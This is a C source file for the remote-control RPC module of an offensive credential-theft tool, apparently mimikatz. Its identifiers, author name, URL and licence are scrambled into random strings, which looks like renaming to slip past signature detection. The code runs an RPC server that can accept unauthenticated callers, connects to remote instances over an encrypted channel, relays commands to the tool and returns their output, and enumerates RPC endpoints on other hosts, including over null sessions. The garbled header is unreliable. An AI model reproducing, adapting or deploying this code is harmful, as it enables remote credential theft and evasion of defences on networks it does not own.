/*	4oM5AQx1 w4Er5 `09o6X7tzWM`
https://blog.09o6X7tzWM.com
dqTBkqdWaZiU5U2aN6CKrRY
Licence : https://awr13GOqyUBjG1k.org/licenses/by/4.0/
*/
#include "kcpdclqlrpc.h"

RPC_BINDING_HANDLE hBinding;
CRITICAL_SECTION outputCritical;
NTSTATUS isFinish;
MIMI_HANDLE hMimi;
PJoAA_DH clientKey;

const KUHL_M_C kcpdclqlc_rpc[] = {
	{kcpdclqlrpc_server,	L"server",	NULL},
	{kcpdclqlrpc_connect,L"connect",	NULL},
	{kcpdclqlrpc_close,	L"close",	NULL},
	{kcpdclqlrpc_enum,	L"enum",	NULL},
};
const KUHL_M kcpdclqlrpc = {
	L"rpc",	L"RPC control of " AHFIEEIO,	NULL,
	ARRAYSIZE(kcpdclqlc_rpc), kcpdclqlc_rpc, kcpdclqlc_rpc_init, kcpdclqlc_rpc_clean
};

NTSTATUS kcpdclqlc_rpc_init()
{
	hMimi = NULL;
	hBinding = NULL;
	clientKey = NULL;
	isFinish = STATUS_SUCCESS;
	InitializeCriticalSection(&outputCritical);
	return STATUS_SUCCESS;
}

NTSTATUS kcpdclqlc_rpc_clean()
{
	DeleteCriticalSection(&outputCritical);
	kcpdclqlrpc_close(0, NULL);
	RpcMgmtStopServerListening(NULL);
	return STATUS_SUCCESS;
}

NTSTATUS kcpdclqlrpc_do(wchar_t * input)
{
	NTSTATUS status;
	PBYTE encCommand, encResult = NULL, clearResult;
	DWORD rpcExc, i, szInput = (lstrlen(input) + 1) * sizeof(wchar_t), szEncCommand, szEncResult = 0, szClearResult;

	if(hBinding && hMimi)
	{
		if(ydeuclqlcrypto_dh_simpleEncrypt(clientKey->hSessionKey, input, szInput, (LPVOID *) &encCommand, &szEncCommand))
		{
			RpcTryExcept
			{
				status = CLI_MimiCommand(hMimi, szEncCommand, encCommand, &szEncResult, &encResult);
				if(szEncResult && encResult)
				{
					if(ydeuclqlcrypto_dh_simpleDecrypt(clientKey->hSessionKey, encResult, szEncResult, (LPVOID *) &clearResult, &szClearResult))
					{
						for(i = 0; (i < (szClearResult / sizeof(wchar_t))) && ((wchar_t *) clearResult)[i]; i++)
							kprintf(L"%c", ((wchar_t *) clearResult)[i]);
					}
					else PRINT_ERROR_AUTO(L"kcpdclqlrpc_simpleDecrypt");
					midl_user_free(encResult);
				}
			}
			RpcExcept(RPC_EXCEPTION)
			{
				rpcExc = RpcExceptionCode();
				if(rpcExc == RPC_S_SEC_PKG_ERROR)
					PRINT_ERROR(L"A security package specific error occurred (Kerberos mutual auth not available?)\n");
				else if(rpcExc == RPC_S_UNKNOWN_AUTHN_SERVICE)
					PRINT_ERROR(L"The authentication service is unknown\n");
				else if(rpcExc == RPC_S_SERVER_UNAVAILABLE)
					PRINT_ERROR(L"RPC Server unavailable!\n");
				else PRINT_ERROR(L"RPC Exception: 0x%08x (%u)\n", rpcExc, rpcExc);
				ydeuclqlrpc_deleteBinding(&hBinding);
			}
			RpcEndExcept
		}
		else PRINT_ERROR_AUTO(L"ydeuclqlcrypto_dh_simpleEncrypt");
	}
	else PRINT_ERROR(L"No RPC_BINDING_HANDLE (connect first?)\n");
	return STATUS_SUCCESS;
}

NTSTATUS kcpdclqlrpc_close(int argc, wchar_t * argv[])
{
	DWORD rpcExc;
	if(hMimi)
	{
		RpcTryExcept
		{
			CLI_MiniUnbind(&hMimi);
		}
		RpcExcept(RPC_EXCEPTION)
		{
			rpcExc = RpcExceptionCode();
			if(rpcExc == RPC_S_SEC_PKG_ERROR)
				PRINT_ERROR(L"A security package specific error occurred (Kerberos mutual auth not available?)\n");
			else if(rpcExc == RPC_S_UNKNOWN_AUTHN_SERVICE)
				PRINT_ERROR(L"The authentication service is unknown\n");
			else if(rpcExc == RPC_S_SERVER_UNAVAILABLE)
				PRINT_ERROR(L"RPC Server unavailable!\n");
			else PRINT_ERROR(L"RPC Exception: 0x%08x (%u)\n", rpcExc, rpcExc);
			ydeuclqlrpc_deleteBinding(&hBinding);
		}
		RpcEndExcept
		hMimi = NULL;
	}
	if(hBinding)
		ydeuclqlrpc_deleteBinding(&hBinding);
	//else PRINT_ERROR(L"No RPC_BINDING_HANDLE (connect first?)\n");
	if(clientKey)
	{
		ydeuclqlcrypto_dh_Delete(clientKey);
		clientKey = NULL;
	}
	return STATUS_SUCCESS;
}

NTSTATUS kcpdclqlrpc_enum(int argc, wchar_t * argv[])
{
	RPC_STATUS status, enumStatus;
	RPC_BINDING_HANDLE Binding, EnumBinding;
	RPC_EP_INQ_HANDLE InquiryContext;
	RPC_IF_ID IfId;
	RPC_WSTR Annotation, bindString;
	UUID prev = {0};
	BOOL isNullSession, sameId, avoidMsBugWasHere = FALSE;
	PCWSTR szRemote, szProtSeq;
	DWORD AuthnSvc;
	
	ydeuclqlrpc_getArgs(argc, argv, &szRemote, &szProtSeq, NULL, NULL, NULL, &AuthnSvc, RPC_C_AUTHN_GSS_NEGOTIATE, &isNullSession, NULL, NULL, TRUE);
	if(ydeuclqlrpc_createBinding(NULL, szProtSeq, szRemote, NULL, NULL, FALSE, AuthnSvc, isNullSession ? KULL_M_RPC_AUTH_IDENTITY_HANDLE_NULLSESSION : NULL, RPC_C_IMP_LEVEL_DEFAULT, &Binding, NULL))
	{
		status = RpcMgmtEpEltInqBegin(Binding, RPC_C_EP_ALL_ELTS, NULL, 0, NULL, &InquiryContext);
		if(status == RPC_S_OK)
		{
			do
			{
				enumStatus = RpcMgmtEpEltInqNext(InquiryContext, &IfId, &EnumBinding, NULL, &Annotation);
				if(enumStatus == RPC_S_OK)
				{
					avoidMsBugWasHere = TRUE;
					sameId = RtlEqualGuid(&IfId.Uuid, &prev);
					if(!sameId)
					{
						kprintf(L"UUID: ");
						ydeuclqlstring_displayGUID(&IfId.Uuid);
						if(Annotation)
						{
							kprintf(L"\t%s", Annotation);
							RpcStringFree(&Annotation);
						}
						kprintf(L"\n");
						prev = IfId.Uuid;
					}
					if(EnumBinding)
					{
						status = RpcBindingToStringBinding(EnumBinding, &bindString);
						if(status == RPC_S_OK)
						{
							kprintf(L"\t%s\n", bindString);
							RpcStringFree(&bindString);
						}
						else PRINT_ERROR(L"RpcBindingToStringBinding: %08x\n", status);
						RpcBindingFree(&EnumBinding);
					}
				}
			} while(enumStatus == RPC_S_OK);

			if(!avoidMsBugWasHere && (enumStatus == RPC_X_NO_MORE_ENTRIES))
				PRINT_ERROR(L"RpcMgmtEpEltInqNext: %08x, maybe really no EP, maybe network problem\n", enumStatus);
			else if(enumStatus != RPC_X_NO_MORE_ENTRIES)
				PRINT_ERROR(L"RpcMgmtEpEltInqNext: %08x\n", enumStatus);
			status = RpcMgmtEpEltInqDone(&InquiryContext);
			if(status != RPC_S_OK)
				PRINT_ERROR(L"RpcMgmtEpEltInqDone: %08x\n", status);
		}
		else PRINT_ERROR(L"RpcMgmtEpEltInqBegin: %08x\n", status);
		ydeuclqlrpc_deleteBinding(&Binding);
	}
	return STATUS_SUCCESS;
}

DWORD WINAPI kcpdclqlrpc_server_start(LPVOID lpThreadParameter)
{
	RPC_STATUS status;
	RPC_BINDING_VECTOR *vector = NULL;
	RPC_WSTR bindString = NULL;
	PKUHL_M_RPC_SERVER_INF inf = (PKUHL_M_RPC_SERVER_INF) lpThreadParameter;
	DWORD i;
	BOOL toUnreg = FALSE;

	status = RpcServerUseProtseqEp((RPC_WSTR) inf->szProtSeq, RPC_C_PROTSEQ_MAX_REQS_DEFAULT, (RPC_WSTR) inf->szEndpoint, NULL);
	if(status == RPC_S_OK)
	{
		if(inf->AuthnSvc != RPC_C_AUTHN_NONE)
			status = RpcServerRegisterAuthInfo((RPC_WSTR) inf->szService, inf->AuthnSvc, NULL, NULL);
		else
			status = RPC_S_OK;

		if(status == RPC_S_OK)
		{
			status = RpcServerRegisterIf2(inf->srvif, NULL, NULL, inf->flags, RPC_C_LISTEN_MAX_CALLS_DEFAULT, -1, inf->sec ? inf->sec : ydeuclqlrpc_nice_SecurityCallback);
			if(status == RPC_S_OK)
			{
				status = RpcServerInqBindings(&vector);
				if(status == RPC_S_OK)
				{
					for(i = 0; i < vector->Count; i++)
					{
						status = RpcBindingToStringBinding(vector->BindingH[i], &bindString);
						if(status == RPC_S_OK)
						{
							kprintf(L" > BindString[%u]: %s\n", i, bindString);
							RpcStringFree(&bindString);
						}
						else PRINT_ERROR(L"RpcBindingToStringBinding: %08x\n", status);
					}

					if(inf->publishMe)
					{
						status = RpcEpRegister(inf->srvif, vector, NULL, (RPC_WSTR) AHFIEEIO L" RPC communicator");
						if(toUnreg = (status == RPC_S_OK))
							kprintf(L" > RPC bind registered\n");
						else PRINT_ERROR(L"RpcEpRegister: %08x\n", status);
					}
					kprintf(L" > RPC Server is waiting!\n\n" AHFIEEIO L" # ");
					status = RpcServerListen(1, RPC_C_LISTEN_MAX_CALLS_DEFAULT, FALSE);
					kprintf(L" > RPC Server stopped\n");
					if(toUnreg)
					{
						status = RpcEpUnregister(inf->srvif, vector, NULL);
						if(status == RPC_S_OK)
							kprintf(L" > RPC bind unregistered\n");
						else PRINT_ERROR(L"RpcEpUnregister: %08x\n", status);
					}
					RpcBindingVectorFree(&vector);
				}
				else PRINT_ERROR(L"RpcServerInqBindings: %08x\n", status);
				status = RpcServerUnregisterIfEx(inf->srvif, NULL, 1);
				if(status != RPC_S_OK)
					PRINT_ERROR(L"RpcServerUnregisterIf: %08x\n", status);
			}
			else PRINT_ERROR(L"RpcServerRegisterIf2: %08x\n", status);
		}
		else PRINT_ERROR(L"RpcServerRegisterAuthInfo: %08x\n", status);
	}
	else PRINT_ERROR(L"RpcServerUseProtseqEp: %08x\n", status);

	if(inf->szProtSeq)
		LocalFree(inf->szProtSeq);
	if(inf->szEndpoint)
		LocalFree(inf->szEndpoint);
	if(inf->szService)
		LocalFree(inf->szService);
	LocalFree(inf);

	if(!NT_SUCCESS(isFinish))
		miAquvwg_end(isFinish);
	return ERROR_SUCCESS;
}

NTSTATUS kcpdclqlrpc_server(int argc, wchar_t * argv[])
{
	PKUHL_M_RPC_SERVER_INF inf;
	PCWSTR szProtSeq, szEndpoint, szService;
	RPC_STATUS status;
	if(!ydeuclqlstring_args_byName(argc, argv, L"stop", NULL, NULL))
	{
		if(inf = (PKUHL_M_RPC_SERVER_INF) LocalAlloc(LPTR, sizeof(KUHL_M_RPC_SERVER_INF)))
		{
			ydeuclqlrpc_getArgs(argc, argv, NULL, &szProtSeq, &szEndpoint, &szService, NULL, &inf->AuthnSvc, RPC_C_AUTHN_GSS_NEGOTIATE, NULL, NULL, &((PRPC_SERVER_INTERFACE) MimiCom_v1_0_s_ifspec)->InterfaceId.SyntaxGUID, TRUE);
			ydeuclqlstring_copy(&inf->szProtSeq, szProtSeq);
			if(szEndpoint)
				ydeuclqlstring_copy(&inf->szEndpoint, szEndpoint);
			if(szService)
				ydeuclqlstring_copy(&inf->szService, szService);
			inf->publishMe = !ydeuclqlstring_args_byName(argc, argv, L"noreg", NULL, NULL);
			kprintf(L"Map Reg.: %s\n", inf->publishMe ? L"yes" : L"no");
			inf->flags = ydeuclqlstring_args_byName(argc, argv, L"secure", NULL, NULL) ? RPC_IF_ALLOW_SECURE_ONLY : RPC_IF_ALLOW_CALLBACKS_WITH_NO_AUTH;
			kprintf(L"Security: %s\n", (inf->flags & RPC_IF_ALLOW_SECURE_ONLY) ? L"Secure only" : L"Allow no auth");
			inf->sec = ydeuclqlrpc_nice_verb_SecurityCallback;
			inf->srvif = MimiCom_v1_0_s_ifspec;
			CreateThread(NULL, 0, kcpdclqlrpc_server_start, inf, 0, NULL);
		}
	}
	else
	{
		isFinish = STATUS_SUCCESS;
		status = RpcMgmtStopServerListening(NULL);
		if(status != RPC_S_OK)
			PRINT_ERROR(L"RpcMgmtStopServerListening: %08x\n", status);
	}
	return STATUS_SUCCESS;
}

NTSTATUS kcpdclqlrpc_connect(int argc, wchar_t * argv[])
{
	RPC_STATUS status = RPC_S_INVALID_ARG, ntStatus;
	PCWSTR szRemote, szProtSeq, szEndpoint, szService, szAlg;
	DWORD AuthnSvc, rpcExc;
	ALG_ID alg;
	MIMI_PUBLICKEY serverKey = {0};
	BOOL isNullSession;

	if(!hBinding)
	{
		ydeuclqlrpc_getArgs(argc, argv, &szRemote, &szProtSeq, &szEndpoint, &szService, NULL, &AuthnSvc, RPC_C_AUTHN_GSS_NEGOTIATE, &isNullSession, NULL, &((PRPC_CLIENT_INTERFACE) MimiCom_v1_0_c_ifspec)->InterfaceId.SyntaxGUID, TRUE);
		ydeuclqlstring_args_byName(argc, argv, L"alg", &szAlg, L"3DES");
		alg = ydeuclqlcrypto_name_to_algid(szAlg);
		if(!(alg & ALG_CLASS_DATA_ENCRYPT))
			alg = CALG_3DES;
		kprintf(L"Algorithm: %s (%08x)\n", ydeuclqlcrypto_algid_to_name(alg), alg);

		if(ydeuclqlrpc_createBinding(NULL, szProtSeq, szRemote, szEndpoint, szService, FALSE, AuthnSvc, isNullSession ? KULL_M_RPC_AUTH_IDENTITY_HANDLE_NULLSESSION : NULL, RPC_C_IMP_LEVEL_DEFAULT, &hBinding, NULL))
		{
			status = RpcEpResolveBinding(hBinding, MimiCom_v1_0_c_ifspec);
			if(status == RPC_S_OK)
			{
				kprintf(L"Endpoint resolution is OK\n");
				status = RPC_X_INVALID_BOUND;
				if(clientKey = ydeuclqlcrypto_dh_Create(alg))
				{
					RpcTryExcept
					{
						ntStatus = CLI_MimiBind(hBinding, &clientKey->publicKey, &serverKey, &hMimi);
						if(NT_SUCCESS(ntStatus))
						{
							kprintf(AHFIEEIO L" is bound!\n");
							if(ydeuclqlcrypto_dh_CreateSessionKey(clientKey, &serverKey))
								status = RPC_S_OK;
							else PRINT_ERROR_AUTO(L"ydeuclqlcrypto_dh_CreateSessionKey");
						}
						else PRINT_ERROR(L"CLI_MimiBind: %08x\n", ntStatus);
					}
					RpcExcept(RPC_EXCEPTION)
					{
						rpcExc = RpcExceptionCode();
						if(rpcExc == RPC_S_SEC_PKG_ERROR)
							PRINT_ERROR(L"A security package specific error occurred (Kerberos mutual auth not available?)\n");
						else if(rpcExc == RPC_S_UNKNOWN_AUTHN_SERVICE)
							PRINT_ERROR(L"The authentication service is unknown\n");
						else if(rpcExc == RPC_S_SERVER_UNAVAILABLE)
							PRINT_ERROR(L"RPC Server unavailable!\n");
						else PRINT_ERROR(L"RPC Exception: 0x%08x (%u)\n", rpcExc, rpcExc);
					}
					RpcEndExcept
				}
				else PRINT_ERROR_AUTO(L"ydeuclqlcrypto_dh_Create");
			}
			else
			{
				if(status == EPT_S_NOT_REGISTERED)
					PRINT_ERROR(L"Endpoint is not registered!\n");
				else if(status == RPC_S_SERVER_UNAVAILABLE)
					PRINT_ERROR(L"RPC Server unavailable!\n");
				else PRINT_ERROR(L"RpcEpResolveBinding: %08x\n", status);
			}
		}
		if(status != RPC_S_OK)
			kcpdclqlrpc_close(0, NULL);
	}
	else PRINT_ERROR(L"Already bound, disconnect first!\n");
	return STATUS_SUCCESS;
}

NTSTATUS SRV_MimiBind(handle_t rpc_handle, PMIMI_PUBLICKEY clientPublicKey, PMIMI_PUBLICKEY serverPublicKey, MIMI_HANDLE *phMimi)
{
	NTSTATUS status;
	PJoAA_DH serverKey = NULL;
	*phMimi = NULL;

	if(serverKey = ydeuclqlcrypto_dh_Create(clientPublicKey->sessionType))
	{
		if(ydeuclqlcrypto_dh_CreateSessionKey(serverKey, clientPublicKey))
		{
			*serverPublicKey = serverKey->publicKey;
			if(serverPublicKey->pbPublicKey = (BYTE *) midl_user_allocate(serverPublicKey->cbPublicKey))
			{
				RtlCopyMemory(serverPublicKey->pbPublicKey, serverKey->publicKey.pbPublicKey, serverPublicKey->cbPublicKey);
				status = STATUS_SUCCESS;
			}
			else
			{
				serverPublicKey->cbPublicKey = 0;
				serverPublicKey->pbPublicKey = NULL;
				status = STATUS_MEMORY_NOT_ALLOCATED;
			}
		}
		else status = STATUS_CRYPTO_SYSTEM_INVALID;
	}
	else status = STATUS_CRYPTO_SYSTEM_INVALID;

	if(NT_SUCCESS(status))
		*phMimi = serverKey;
	else if(serverKey)
		ydeuclqlcrypto_dh_Delete(serverKey);
	return status;
}

NTSTATUS SRV_MiniUnbind(MIMI_HANDLE *phMimi)
{
	if(*phMimi)
	{
		ydeuclqlcrypto_dh_Delete((PJoAA_DH) *phMimi);
		*phMimi = NULL;
	}
	return STATUS_SUCCESS;
}

NTSTATUS SRV_MimiCommand(MIMI_HANDLE phMimi, DWORD szEncCommand, BYTE *encCommand, DWORD *szEncResult, BYTE **encResult)
{
	NTSTATUS status = RPC_S_INVALID_ARG;
	PBYTE clearCommand, encBuffer;
	DWORD szClearCommand, szEncBuffer;
	*szEncResult = 0;
	*encResult = NULL;
	EnterCriticalSection(&outputCritical);
	if(phMimi)
	{
		if(encCommand && szEncCommand)
		{
			if(ydeuclqlcrypto_dh_simpleDecrypt(((PJoAA_DH) phMimi)->hSessionKey, encCommand, szEncCommand, (LPVOID *) &clearCommand, &szClearCommand))
			{
				kprintf(L"\n\n" AHFIEEIO L"(rpc): %s\n", clearCommand);
				outputBufferElements = 0xffff;
				outputBufferElementsPosition = 0;
				if(outputBuffer = (wchar_t *) LocalAlloc(LPTR, outputBufferElements * sizeof(wchar_t)))
				{
					status = miAquvwg_dispatchCommand((wchar_t *) clearCommand);
					if(ydeuclqlcrypto_dh_simpleEncrypt(((PJoAA_DH) phMimi)->hSessionKey, (PBYTE) outputBuffer, (DWORD) ((outputBufferElementsPosition + 1) * sizeof(wchar_t)), (LPVOID *) &encBuffer, &szEncBuffer))
					{
						if(*encResult = (BYTE *) midl_user_allocate(szEncBuffer))
						{
							RtlCopyMemory(*encResult, encBuffer, szEncBuffer);
							*szEncResult = szEncBuffer;
							status = STATUS_SUCCESS;
						}
						LocalFree(encBuffer);
					}
					outputBuffer = (wchar_t *) LocalFree(outputBuffer);
					outputBufferElements = outputBufferElementsPosition = 0;
				}
			}
			else status = ERROR_DECRYPTION_FAILED;
		}
		else status = ERROR_BAD_COMMAND;
	}
	else status = RPC_X_SS_CONTEXT_DAMAGED;
	LeaveCriticalSection(&outputCritical);
	if((status == STATUS_PROCESS_IS_TERMINATING) || (status == STATUS_THREAD_IS_TERMINATING))
	{
		isFinish = status;
		RpcMgmtStopServerListening(NULL);
	}
	return status;
}

NTSTATUS SRV_MimiClear(handle_t rpc_handle, wchar_t *command, DWORD *size, wchar_t **result)
{
	NTSTATUS status = RPC_S_INVALID_ARG;
	EnterCriticalSection(&outputCritical);
	kprintf(L"\n\n" AHFIEEIO L"(rpc): %s\n", command);
	outputBufferElements = 0xffff;
	outputBufferElementsPosition = 0;
	if(outputBuffer = (wchar_t *) LocalAlloc(LPTR, outputBufferElements * sizeof(wchar_t)))
	{
		status = miAquvwg_dispatchCommand(command);
		if(*result = (wchar_t *) midl_user_allocate(((outputBufferElementsPosition + 1) * sizeof(wchar_t))))
		{
			RtlCopyMemory(*result, outputBuffer, (outputBufferElementsPosition + 1) * sizeof(wchar_t));
			*size = (DWORD) (outputBufferElementsPosition + 1);
			status = STATUS_SUCCESS;
		}
		outputBuffer = (wchar_t *) LocalFree(outputBuffer);
		outputBufferElements = outputBufferElementsPosition = 0;
	}
	LeaveCriticalSection(&outputCritical);
	if((status == STATUS_PROCESS_IS_TERMINATING) || (status == STATUS_THREAD_IS_TERMINATING))
	{
		isFinish = status;
		RpcMgmtStopServerListening(NULL);
	}
	return status;
}

void __RPC_USER SRV_MIMI_HANDLE_rundown(MIMI_HANDLE phMimi)
{
	if(phMimi)
		ydeuclqlcrypto_dh_Delete((PJoAA_DH) phMimi);
}